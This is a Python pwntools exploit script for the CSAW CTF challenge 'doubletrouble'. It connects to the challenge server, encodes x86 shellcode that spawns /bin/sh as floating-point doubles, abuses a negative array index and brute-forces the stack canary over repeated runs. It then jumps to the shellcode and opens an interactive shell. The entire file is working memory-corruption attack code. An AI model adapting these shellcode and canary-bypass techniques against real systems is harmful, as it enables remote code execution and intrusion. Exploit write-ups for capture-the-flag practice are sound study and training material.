#!/usr/bin/env python2
from pwn import *
import binascii
import codecs

"""
NOTE: Must be ran multiple times to brute force stack canary.
"""


def hextodouble(hexstring):
    print(len(hexstring))
    return str("%.16E" % struct.unpack("!d", codecs.decode(hexstring, "hex"))[0])


# context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

# p = process("./doubletrouble")
p = remote("pwn.chal.csaw.io", 9002)

stack_address = p.readline()[2:-1].strip()

# shellcode
shellcode1 = "fcfc56f631580b6a"
shellcode2 = "f9f9f968732f2f68"
shellcode3 = "f8e3896e69622f68"
shellcode4 = "f7fa80cdca89c931"
shellcodesortedbelowthis = "f7f94e24f7f94e24"

p.sendline("64")
for i in range(4):
    p.sendline(hextodouble(shellcodesortedbelowthis))
p.sendline("-11")
for i in range(57 - 4):  # subtract 4 for shellcode
    p.sendline(hextodouble(shellcodesortedbelowthis))

p.sendline(hextodouble(shellcode1))
p.sendline(hextodouble(shellcode2))
p.sendline(hextodouble(shellcode3))
p.sendline(hextodouble(shellcode4))

jmpebp = "080497b800000000"  # 4.86192279173924203790903928618E-270
shellcode_location = (
    "080497b8" + stack_address
)  # that first part is pading to be sorted in the right spot
print("shellcode_location: ")
print(shellcode_location)
print(hextodouble(shellcode_location))

p.sendline(hextodouble(shellcode_location))
p.sendline(hextodouble(jmpebp))

p.sendline("ls")
p.recvuntil("flag")
p.interactive()
